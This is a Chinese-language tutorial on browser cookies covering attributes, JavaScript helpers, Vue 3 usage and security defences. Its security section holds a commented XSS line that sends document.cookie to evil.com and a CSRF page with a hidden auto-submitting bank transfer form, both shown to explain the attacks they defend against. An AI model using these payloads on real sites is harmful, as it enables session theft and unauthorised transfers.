### 一、概述

Cookie 是浏览器存储在客户端的一小段**文本数据**（通常不超过 4KB），由服务器通过 HTTP 响应头 `Set-Cookie` 下发，浏览器会在后续的**每次同源 HTTP 请求**中自动通过 `Cookie` 请求头携带它们。Cookie 最初设计用于**维持 HTTP 有状态会话**（HTTP 本身是无状态协议），如今广泛用于身份认证、用户偏好、跟踪分析等场景。

> 📖 [MDN - HTTP Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)

### 二、Cookie 的工作流程

```
┌──────────┐                          ┌──────────┐
│  客户端   │                          │  服务端   │
│ (浏览器)  │                          │          │
└────┬─────┘                          └────┬─────┘
     │   1. 首次请求（无 Cookie）            │
     │ ──────────────────────────────────► │
     │                                     │
     │   2. 响应头 Set-Cookie: id=abc123   │
     │ ◄────────────────────────────────── │
     │                                     │
     │   （浏览器保存 Cookie 到本地）         │
     │                                     │
     │   3. 后续请求自动携带 Cookie 头       │
     │   Cookie: id=abc123                 │
     │ ──────────────────────────────────► │
     │                                     │
     │   4. 服务端根据 Cookie 识别用户       │
     │ ◄────────────────────────────────── │
```

### 三、Cookie 的属性

每个 Cookie 除了 `name=value` 之外，还有多个可选属性来控制其行为：

| 属性 | 描述 | 示例 |
| :--: | :--: | :--: |
| `Name=Value` | 键值对，Cookie 的核心内容 | `token=abc123` |
| `Domain` | Cookie 所属域名，只在匹配该域名时发送 | `Domain=example.com` |
| `Path` | Cookie 所属路径，只在匹配该路径时发送 | `Path=/api` |
| `Expires` | 过期时间（绝对时间），过期后自动删除 | `Expires=Wed, 09 Jun 2027 10:18:14 GMT` |
| `Max-Age` | 过期时间（相对秒数），优先级高于 Expires | `Max-Age=86400`（1天） |
| `HttpOnly` | 禁止 JavaScript 访问（`document.cookie` 无法读取） | `HttpOnly` |
| `Secure` | 仅在 HTTPS 协议下发送 | `Secure` |
| `SameSite` | 控制跨站请求是否携带 Cookie | `SameSite=Strict` |

#### 一个完整的 Set-Cookie 示例

```
Set-Cookie: sessionId=abc123; Domain=example.com; Path=/; Max-Age=86400; HttpOnly; Secure; SameSite=Lax
```

### 四、创建 Cookie

#### 1. 服务端设置（推荐）

服务端通过 HTTP 响应头 `Set-Cookie` 设置 Cookie，这也是**最安全**的方式：

```js
// Node.js / Express 示例
app.get('/login', (req, res) => {
  // 设置单个 Cookie
  res.setHeader('Set-Cookie', 'token=abc123; HttpOnly; Secure; Max-Age=86400; SameSite=Lax');

  // Express 的 cookie 方法
  res.cookie('token', 'abc123', {
    maxAge: 86400 * 1000,    // 1天（毫秒）
    httpOnly: true,           // JS 无法读取
    secure: true,             // 仅 HTTPS
    sameSite: 'lax',          // 跨站策略
    domain: 'example.com',    // 域名
    path: '/',                // 路径
  });

  // 设置多个 Cookie（多次 Set-Cookie）
  res.cookie('lang', 'zh-CN', { maxAge: 30 * 24 * 3600 * 1000 });
  res.cookie('theme', 'dark', { maxAge: 365 * 24 * 3600 * 1000 });
});
```

#### 2. 客户端设置（document.cookie）

浏览器端通过 `document.cookie` 进行读写。**注意：这不是一个普通字符串属性，赋值操作是"追加/更新"语义，而非"覆盖"。**

```js
// 设置 Cookie（本质是追加或更新，不会清除其他已有 Cookie）
document.cookie = 'username=Alice';
document.cookie = 'theme=dark';
document.cookie = 'lang=zh-CN';

// 带属性设置
document.cookie = 'token=abc123; max-age=86400; path=/; secure';
document.cookie = 'sessionId=xyz789; max-age=3600; path=/api; HttpOnly';

// ❌ document.cookie 赋值无法设置 HttpOnly（浏览器会忽略该属性）
// HttpOnly 只能由服务端通过 Set-Cookie 响应头设置
```

> 💡 **提示：** `document.cookie` 的值不支持分号 `;`、逗号 `,`、空格等特殊字符，需要用 `encodeURIComponent` 编码。

```js
// 编码存储
document.cookie = `username=${encodeURIComponent('张三')}`;
document.cookie = `data=${encodeURIComponent(JSON.stringify({ role: 'admin' }))}`;

// 解码读取
const value = decodeURIComponent(getCookie('data'));
const obj = JSON.parse(value); // { role: 'admin' }
```

### 五、读取 Cookie

```js
// document.cookie 返回当前页面可访问的所有 Cookie 的字符串
// 格式：'name1=value1; name2=value2; name3=value3'
console.log(document.cookie);
// 'username=Alice; theme=dark; lang=zh-CN'

// ⚠️ HttpOnly 的 Cookie 不会出现在 document.cookie 中！
// ⚠️ 不匹配当前 Domain / Path / Secure 的 Cookie 也不会出现
```

#### 封装 Cookie 读取函数

```js
/**
 * 获取指定名称的 Cookie 值
 * @param {string} name - Cookie 名称
 * @returns {string|null} Cookie 值，不存在返回 null
 */
function getCookie(name) {
  const cookies = document.cookie.split('; ');
  for (const cookie of cookies) {
    const [key, ...rest] = cookie.split('=');
    if (decodeURIComponent(key) === name) {
      return decodeURIComponent(rest.join('=')); // 值中可能包含 '='
    }
  }
  return null;
}

// 使用
getCookie('username'); // 'Alice'
getCookie('notExist'); // null
```

#### 解析所有 Cookie 为对象

```js
function getAllCookies() {
  const obj = {};
  if (!document.cookie) return obj;

  document.cookie.split('; ').forEach((pair) => {
    const [key, ...rest] = pair.split('=');
    obj[decodeURIComponent(key)] = decodeURIComponent(rest.join('='));
  });

  return obj;
}

// 使用
getAllCookies();
// { username: 'Alice', theme: 'dark', lang: 'zh-CN' }
```

### 六、修改 Cookie

修改 Cookie 的方式与创建相同——只要 `name`、`domain`、`path` 三者一致，就会**覆盖**已有的 Cookie：

```js
// 创建
document.cookie = 'username=Alice; path=/';

// 修改（同 name + 同 path → 覆盖）
document.cookie = 'username=Bob; path=/';

// ⚠️ 如果 path 不一致，不会覆盖，而是创建新的 Cookie
document.cookie = 'username=Charlie; path=/api';
// 此时存在两个 Cookie：
//   username=Bob; path=/
//   username=Charlie; path=/api
```

### 七、删除 Cookie

删除 Cookie 没有专门的 API，需要通过将 `max-age` 设为 `0`（或 `expires` 设为过去时间）来实现，**同时 `domain` 和 `path` 必须与创建时完全一致**：

```js
/**
 * 删除指定 Cookie
 * @param {string} name - Cookie 名称
 * @param {string} [path='/'] - 必须与创建时一致
 * @param {string} [domain] - 必须与创建时一致
 */
function deleteCookie(name, path = '/', domain) {
  let cookieStr = `${encodeURIComponent(name)}=; max-age=0; path=${path}`;
  if (domain) cookieStr += `; domain=${domain}`;
  document.cookie = cookieStr;
}

// 使用
deleteCookie('username');                 // 删除 path=/ 的 username
deleteCookie('username', '/api');          // 删除 path=/api 的 username
deleteCookie('username', '/', 'example.com'); // 指定域名删除
```

### 八、Cookie 核心属性详解

#### 1. Domain —— 域名作用域

控制 Cookie 在哪些域名下生效：

```js
// 服务端设置
Set-Cookie: id=abc; Domain=example.com

// 此时 Cookie 在以下域名都有效：
// ✅ example.com
// ✅ www.example.com
// ✅ api.example.com
// ✅ a.b.example.com（所有子域名）

// ❌ 不设置 Domain 时，Cookie 只在当前精确域名下生效（不含子域名）
Set-Cookie: id=abc; （在 www.example.com 设置，不带 Domain）
// ✅ www.example.com 有效
// ❌ example.com 无效
// ❌ api.example.com 无效
```

> ⚠️ **注意：** 不能为其他域设置 Cookie。例如 `example.com` 的页面不能设置 `Domain=other.com` 的 Cookie，浏览器会拒绝。

#### 2. Path —— 路径作用域

控制 Cookie 在哪些 URL 路径下生效：

```js
// 设置 Path=/api
Set-Cookie: token=abc; Path=/api

// ✅ /api/users      → 匹配
// ✅ /api/v1/data    → 匹配（/api 的子路径也匹配）
// ❌ /home           → 不匹配
// ❌ /apiserver      → 不匹配（不是 /api 的子路径）

// Path=/（默认值）
// → 所有路径都匹配
```

#### 3. Expires / Max-Age —— 过期时间

决定 Cookie 的生命周期：

```js
// ---- 会话 Cookie（Session Cookie）----
// 不设置 Expires 和 Max-Age → Cookie 在浏览器关闭后删除
Set-Cookie: temp=data;
document.cookie = 'temp=data'; // 关闭浏览器后消失

// ---- 持久 Cookie（Persistent Cookie）----
// 方式 1：Expires（绝对时间，HTTP 日期格式）
Set-Cookie: token=abc; Expires=Wed, 09 Jun 2027 10:18:14 GMT

// 方式 2：Max-Age（相对秒数，优先级更高）
Set-Cookie: token=abc; Max-Age=86400  // 86400秒 = 1天

// 客户端设置
document.cookie = 'token=abc; max-age=' + 60 * 60 * 24 * 7; // 7天

// 过去时间 → 删除 Cookie
document.cookie = 'token=abc; max-age=0';
document.cookie = 'token=abc; expires=Thu, 01 Jan 1970 00:00:00 GMT';
```

| 属性 | 类型 | 优先级 | 说明 |
| :--: | :--: | :--: | :--: |
| `Max-Age` | 相对秒数 | **高** | 从设置时刻开始计算的存活秒数 |
| `Expires` | 绝对时间 | 低 | 指定过期的具体日期时间 |
| 都不设置 | — | — | 会话 Cookie，浏览器关闭即删除 |

#### 4. HttpOnly —— 禁止 JS 访问

```js
// 服务端设置
Set-Cookie: sessionId=secret123; HttpOnly

// 效果：
// ❌ document.cookie  → 看不到这个 Cookie
// ❌ JavaScript 无法读取、修改、删除
// ✅ 浏览器仍会在 HTTP 请求中自动携带
// ✅ 防御 XSS 攻击窃取 Cookie
```

> 💡 **关键：** `HttpOnly` **只能由服务端设置**，客户端 `document.cookie` 中写 `HttpOnly` 会被浏览器忽略。

#### 5. Secure —— 仅 HTTPS 传输

```js
// 仅在 HTTPS 连接下才会发送此 Cookie
Set-Cookie: token=abc; Secure

// ❌ http://example.com → 不会发送此 Cookie
// ✅ https://example.com → 会发送此 Cookie
// ✅ localhost（开发环境）→ 大部分浏览器视为安全上下文，也会发送
```

#### 6. SameSite —— 跨站请求策略

控制浏览器在**跨站请求**（从外部站点发起的请求）时是否携带 Cookie，是防御 CSRF 攻击的重要手段。

| 值 | 行为 | 适用场景 |
| :--: | :--: | :--: |
| `Strict` | 完全禁止跨站发送。即使从外部链接点进来也不带 Cookie | 敏感操作（如银行、支付） |
| `Lax` | 导航到目标网站的 GET 请求允许携带，其他跨站请求禁止 | **大多数场景的推荐值**（Chrome 默认值） |
| `None` | 允许跨站发送，**必须同时设置 Secure** | 第三方登录、嵌入式功能、跨站追踪 |

```js
// Strict：最严格
// 从其他网站点击链接到 example.com 时，不会携带此 Cookie（用户看起来像未登录）
Set-Cookie: sessionId=abc; SameSite=Strict

// Lax：平衡安全与可用性（Chrome 默认行为）
// 从其他网站点击链接到 example.com 时，GET 导航请求会携带 Cookie
// 但 POST 表单、iframe、AJAX、img 等跨站请求不会携带
Set-Cookie: sessionId=abc; SameSite=Lax

// None：允许跨站（必须搭配 Secure）
Set-Cookie: trackingId=abc; SameSite=None; Secure
```

**SameSite=Lax 允许携带的跨站场景：**

```js
// ✅ 以下 GET 导航请求会携带 Cookie：
// 1. <a href="https://example.com">链接</a>
// 2. window.open('https://example.com')
// 3. location.href = 'https://example.com'

// ❌ 以下跨站请求不会携带 Cookie：
// 1. <form method="POST" action="https://example.com">
// 2. <img src="https://example.com/track">
// 3. fetch('https://example.com/api', { credentials: 'include' })
// 4. <iframe src="https://example.com">
```

### 九、Cookie 工具函数封装

```js
/**
 * Cookie 工具类
 * 支持编码解码、JSON 序列化、过期时间、完整属性配置
 */
const CookieUtil = {
  /**
   * 设置 Cookie
   * @param {string} name - 名称
   * @param {*} value - 值（支持对象，自动序列化）
   * @param {object} [options] - 可选属性
   * @param {number} [options.maxAge] - 过期秒数
   * @param {string} [options.path='/'] - 路径
   * @param {string} [options.domain] - 域名
   * @param {boolean} [options.secure=false] - 仅 HTTPS
   * @param {string} [options.sameSite='Lax'] - 跨站策略
   */
  set(name, value, options = {}) {
    const {
      maxAge,
      path = '/',
      domain,
      secure = false,
      sameSite = 'Lax',
    } = options;

    let cookieStr = `${encodeURIComponent(name)}=${encodeURIComponent(
      typeof value === 'object' ? JSON.stringify(value) : String(value)
    )}`;

    if (maxAge !== undefined) cookieStr += `; max-age=${maxAge}`;
    if (path) cookieStr += `; path=${path}`;
    if (domain) cookieStr += `; domain=${domain}`;
    if (secure) cookieStr += '; secure';
    if (sameSite) cookieStr += `; samesite=${sameSite}`;

    document.cookie = cookieStr;
  },

  /**
   * 获取 Cookie 值
   * @param {string} name - 名称
   * @param {boolean} [parseJson=false] - 是否尝试 JSON 解析
   * @returns {string|null|object}
   */
  get(name, parseJson = false) {
    const cookies = document.cookie.split('; ');
    for (const cookie of cookies) {
      const [key, ...rest] = cookie.split('=');
      if (decodeURIComponent(key) === name) {
        const raw = decodeURIComponent(rest.join('='));
        if (parseJson) {
          try { return JSON.parse(raw); } catch { return raw; }
        }
        return raw;
      }
    }
    return null;
  },

  /** 获取所有 Cookie 为对象 */
  getAll() {
    const obj = {};
    if (!document.cookie) return obj;
    document.cookie.split('; ').forEach((pair) => {
      const [key, ...rest] = pair.split('=');
      obj[decodeURIComponent(key)] = decodeURIComponent(rest.join('='));
    });
    return obj;
  },

  /**
   * 删除 Cookie
   * @param {string} name - 名称
   * @param {object} [options] - path/domain 必须与创建时一致
   */
  remove(name, options = {}) {
    const { path = '/', domain } = options;
    let cookieStr = `${encodeURIComponent(name)}=; max-age=0; path=${path}`;
    if (domain) cookieStr += `; domain=${domain}`;
    document.cookie = cookieStr;
  },

  /** 检查 Cookie 是否存在 */
  has(name) {
    return this.get(name) !== null;
  },
};

// ─── 使用示例 ───

// 基本设置
CookieUtil.set('username', 'Alice');
CookieUtil.set('theme', 'dark', { maxAge: 365 * 24 * 3600 }); // 1年

// 存储对象
CookieUtil.set('settings', { lang: 'zh-CN', fontSize: 14 }, { maxAge: 30 * 24 * 3600 });

// 读取
CookieUtil.get('username');                              // 'Alice'
CookieUtil.get('settings', true);                        // { lang: 'zh-CN', fontSize: 14 }
CookieUtil.get('notExist');                              // null

// 读取所有
CookieUtil.getAll();                                     // { username: 'Alice', theme: 'dark', ... }

// 检查
CookieUtil.has('username');                              // true

// 删除
CookieUtil.remove('username');
CookieUtil.remove('theme', { path: '/', domain: 'example.com' });
```

### 十、Cookie 与安全

#### 1. XSS 攻击与 Cookie 窃取

XSS（跨站脚本攻击）可以在页面中注入恶意 JavaScript，读取 `document.cookie` 获取敏感 Cookie：

```js
// 攻击者注入的恶意代码：
// new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;

// 防御措施：设置 HttpOnly
// 服务端：
Set-Cookie: sessionId=secret; HttpOnly

// 这样 document.cookie 就无法读取 sessionId，XSS 攻击拿不到它
```

#### 2. CSRF 攻击与 Cookie 伪造

CSRF（跨站请求伪造）利用浏览器自动携带 Cookie 的特性，在用户不知情的情况下发起请求：

```html
<!-- 攻击者网站上的恶意代码 -->
<!-- 用户已登录 bank.com，浏览器会自动携带 bank.com 的 Cookie -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" style="display:none">

<!-- 或者用 POST 表单 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

**防御措施：**

```js
// 1. 设置 SameSite 属性（最简单有效）
Set-Cookie: sessionId=abc; SameSite=Strict
// 或 SameSite=Lax（推荐，兼顾可用性）

// 2. CSRF Token（双重验证）
// 服务端生成随机 Token，嵌入表单，提交时验证
app.use((req, res, next) => {
  // 生成 CSRF Token
  const csrfToken = crypto.randomUUID();
  // 通过 Cookie 发送给客户端（可被 JS 读取）
  res.cookie('csrfToken', csrfToken, { httpOnly: false });
  // 同时存储在服务端 Session 中
  req.session.csrfToken = csrfToken;
  next();
});

// 前端请求时将 Token 放入请求头
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': CookieUtil.get('csrfToken'),
  },
  body: JSON.stringify({ to: 'bob', amount: 100 }),
});

// 3. 验证 Referer / Origin 头
// 服务端检查请求来源是否为合法域名
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (origin && !origin.startsWith('https://example.com')) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
});
```

#### 3. Cookie 劫持与网络嗅探

```js
// 在非加密 HTTP 传输中，Cookie 以明文传输，容易被中间人截获

// 防御：设置 Secure 属性
Set-Cookie: sessionId=abc; Secure
// 确保 Cookie 仅在 HTTPS 加密连接中传输
```

#### 4. 安全配置最佳实践

```js
// ✅ 推荐的安全 Cookie 配置
Set-Cookie: sessionId=abc123;
  HttpOnly;          // 禁止 JS 访问，防 XSS
  Secure;            // 仅 HTTPS，防窃听
  SameSite=Lax;      // 防 CSRF（推荐默认值）
  Path=/;
  Max-Age=3600;      // 短过期时间，减少被盗用的风险窗口
  Domain=example.com;

// 不同类型 Cookie 的安全建议：
// ┌─────────────────┬──────────┬──────────┬──────────┐
// │    Cookie 类型   │ HttpOnly │  Secure  │ SameSite │
// ├─────────────────┼──────────┼──────────┼──────────┤
// │ 会话 ID / Token │    ✅    │    ✅    │ Lax/Strict│
// │ CSRF Token      │    ❌    │    ✅    │   Lax    │
// │ 用户偏好设置     │    ❌    │    可选  │   Lax    │
// │ 第三方追踪       │    ❌    │    ✅    │   None   │
// └─────────────────┴──────────┴──────────┴──────────┘
```

### 十一、第三方 Cookie 与跨域

#### 1. 什么是第三方 Cookie

```js
// 当用户访问 site-a.com 时，页面中嵌入了 site-b.com 的资源：
// <img src="https://site-b.com/track?source=siteA">
// <script src="https://site-b.com/analytics.js"></script>

// 如果 site-b.com 在响应中设置了 Cookie：
Set-Cookie: visitorId=xyz; Domain=site-b.com; SameSite=None; Secure

// 这就是"第三方 Cookie"：
// - Cookie 的 Domain（site-b.com）与当前页面域名（site-a.com）不同
// - 用于跨站追踪、广告投放、第三方登录等
```

#### 2. 跨域请求携带 Cookie

```js
// 前端 fetch 跨域请求默认不发送 Cookie
fetch('https://api.example.com/data'); // → 不带 Cookie

// 需要显式设置 credentials
fetch('https://api.example.com/data', {
  credentials: 'include', // 无论同源还是跨域，都发送 Cookie
});

// credentials 选项说明：
// 'same-origin'（默认）→ 仅同源请求发送 Cookie
// 'include'           → 同源和跨源请求都发送 Cookie
// 'omit'              → 都不发送

// 服务端必须配置 CORS 头允许凭据
// Access-Control-Allow-Origin 不能是 *，必须指定具体域名
// Access-Control-Allow-Credentials: true
app.use(cors({
  origin: 'https://www.example.com',  // 不能是 *
  credentials: true,                   // 允许携带 Cookie
}));
```

```js
// Axios 跨域携带 Cookie
axios.get('https://api.example.com/data', {
  withCredentials: true, // 等同于 fetch 的 credentials: 'include'
});
```

#### 3. 浏览器对第三方 Cookie 的限制

```js
// 主流浏览器对第三方 Cookie 的政策：
// ┌──────────────┬──────────────────────────────────────┐
// │    浏览器     │              政策                     │
// ├──────────────┼──────────────────────────────────────┤
// │ Chrome       │ 已逐步淘汰第三方 Cookie（2024-2025）  │
// │ Safari       │ ITP（智能追踪防护），默认阻止          │
// │ Firefox      │ 增强追踪保护（ETP），默认阻止          │
// │ Edge         │ 跟随 Chromium 策略                    │
// └──────────────┴──────────────────────────────────────┘

// 替代方案：
// 1. 服务端代理：通过自己的后端代理第三方请求，避免跨域
// 2. OAuth 2.0 / OIDC：标准化的第三方认证
// 3. Privacy Sandbox（Google）：Topics API、Attribution Reporting 等
// 4. First-Party Cookie：尽量在自家域名下使用 Cookie
```

### 十二、Cookie 的限制

| 限制项 | 说明 |
| :--: | :--: |
| **大小** | 每个 Cookie 不超过 **4KB**（包含名称和值） |
| **数量** | 每个域名下通常不超过 **50 个** Cookie（浏览器有差异） |
| **格式** | 只能存储**纯文本字符串**，不支持二进制数据 |
| **编码** | 不允许分号 `;`、逗号 `,`、空格等特殊字符，需编码 |
| **性能** | 每次 HTTP 请求都会携带匹配的 Cookie，增加网络开销 |
| **安全** | 默认可被 JS 访问，受 XSS 威胁；自动携带，受 CSRF 威胁 |

```js
// Cookie 数量超出限制时，浏览器的处理策略：
// 1. 最少使用的（LRU）→ 删除最久未使用的 Cookie
// 2. 随机删除
// 所以不要依赖 Cookie 存储重要数据，有可能被悄悄清理

// 大小超出 4KB 会被截断或拒绝
document.cookie = 'data=' + 'x'.repeat(5000); // 可能只保存了前 4096 字节
```

### 十三、Cookie 的典型应用场景

#### 1. 会话管理（身份认证）

```js
// 最常见的 Cookie 用途：维持用户登录状态

// 服务端（Express + express-session）
const session = require('express-session');

app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,   // 防 XSS
    secure: true,     // 仅 HTTPS
    sameSite: 'lax',  // 防 CSRF
    maxAge: 3600000,  // 1小时（毫秒）
  },
}));

// 登录
app.post('/login', (req, res) => {
  // 验证用户名密码...
  req.session.userId = user.id;
  res.json({ success: true });
});

// 验证登录状态
app.get('/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: '未登录' });
  }
  // 查询用户信息...
});
```

#### 2. JWT Token 存储

```js
// 方式 1：存储在 Cookie 中（推荐，比 localStorage 更安全）
// 服务端设置
res.cookie('token', jwtToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 2 * 3600 * 1000, // 2小时
});

// 方式 2：存储在 localStorage 中（前端可以读取，灵活但安全性较低）
// 详见 localStorage 文档

// Cookie 存储 JWT 的优势：
// ✅ HttpOnly 防 XSS 窃取
// ✅ 自动随请求携带，前端无需手动添加请求头
// ✅ 配合 SameSite 防 CSRF
```

#### 3. 用户偏好

```js
// 服务端设置
res.cookie('theme', 'dark', { maxAge: 365 * 24 * 3600 * 1000 }); // 1年
res.cookie('lang', 'zh-CN', { maxAge: 365 * 24 * 3600 * 1000 });

// 客户端也可以设置（无需 HttpOnly）
document.cookie = `theme=dark; max-age=${365 * 24 * 3600}; path=/`;
document.cookie = `lang=zh-CN; max-age=${365 * 24 * 3600}; path=/`;

// 读取
const theme = CookieUtil.get('theme') || 'light';
const lang = CookieUtil.get('lang') || 'zh-CN';
```

### 十四、在 Vue 3 中使用 Cookie

#### 1. 组合式 API 封装

```js
// composables/useCookie.js
import { ref, watch } from 'vue';

export function useCookie(name, defaultValue = null, options = {}) {
  const {
    maxAge = 365 * 24 * 3600,
    path = '/',
    domain,
    secure = false,
    sameSite = 'Lax',
  } = options;

  // 读取初始值
  const readValue = () => {
    const value = CookieUtil.get(name);
    if (value === null) return defaultValue;
    try { return JSON.parse(value); } catch { return value; }
  };

  const data = ref(readValue());

  // 监听变化，自动同步到 Cookie
  watch(data, (newVal) => {
    CookieUtil.set(name, newVal, { maxAge, path, domain, secure, sameSite });
  }, { deep: true });

  // 删除
  const remove = () => {
    CookieUtil.remove(name, { path, domain });
    data.value = defaultValue;
  };

  return { data, remove };
}
```

```vue
<!-- 在组件中使用 -->
<script setup>
import { useCookie } from '@/composables/useCookie';

const { data: theme, remove: removeTheme } = useCookie('app_theme', 'light');
const { data: lang } = useCookie('app_lang', 'zh-CN');

function toggleTheme() {
  theme.value = theme.value === 'light' ? 'dark' : 'light';
}
</script>

<template>
  <div :data-theme="theme">
    <button @click="toggleTheme">当前主题：{{ theme }}</button>
    <p>语言：{{ lang }}</p>
  </div>
</template>
```

#### 2. Axios 请求拦截器自动携带 Cookie

```js
// utils/request.js
import axios from 'axios';

const request = axios.create({
  baseURL: '/api',
  withCredentials: true, // 跨域请求自动携带 Cookie
  timeout: 10000,
});

// 如果使用 JWT 存在 Cookie 中，无需手动添加 Authorization 头
// 浏览器会自动携带 HttpOnly Cookie

// 如果 JWT 存在 localStorage 中，则需要手动添加
request.interceptors.request.use((config) => {
  // 仅当不使用 HttpOnly Cookie 方案时才需要
  const token = localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

export default request;
```

### 十五、与 localStorage / sessionStorage 对比

| 特性 | Cookie | localStorage | sessionStorage |
| :--: | :--: | :--: | :--: |
| **容量** | ~4KB | ~5MB | ~5MB |
| **生命周期** | 可设过期时间 | 永久 | 标签页会话 |
| **随 HTTP 请求发送** | ✅ 自动携带 | ❌ | ❌ |
| **服务端访问** | ✅ | ❌ | ❌ |
| **客户端 API** | `document.cookie`（字符串拼接） | `setItem / getItem` | `setItem / getItem` |
| **数据类型** | 仅字符串 | 仅字符串 | 仅字符串 |
| **跨标签页** | ✅ | ✅ | ❌ |
| **安全属性** | HttpOnly / Secure / SameSite | 同源策略 | 同源 + 标签页隔离 |

**选择建议：**

- 需要服务端读取的身份凭证 → **Cookie**（HttpOnly + Secure + SameSite）
- 需要在用户下次访问时保留的客户端数据 → **localStorage**
- 只在当前会话使用的临时数据 → **sessionStorage**
- 大量结构化数据 → **IndexedDB**

### 十六、总结

| 场景 | 推荐方案 | Cookie 配置 |
| :--: | :--: | :--: |
| 用户登录态 | Cookie（Session ID / JWT） | HttpOnly + Secure + SameSite=Lax/Strict |
| CSRF 防护 | Cookie（CSRF Token） | 非 HttpOnly + Secure + SameSite=Lax |
| 用户偏好（主题、语言） | Cookie 或 localStorage | Secure + SameSite=Lax + 长过期时间 |
| 购物车（未登录） | localStorage | — |
| 临时表单数据 | sessionStorage | — |
| 第三方登录/嵌入 | Cookie | SameSite=None + Secure |
| 敏感信息（密码等） | **永远不要存在客户端** | — |
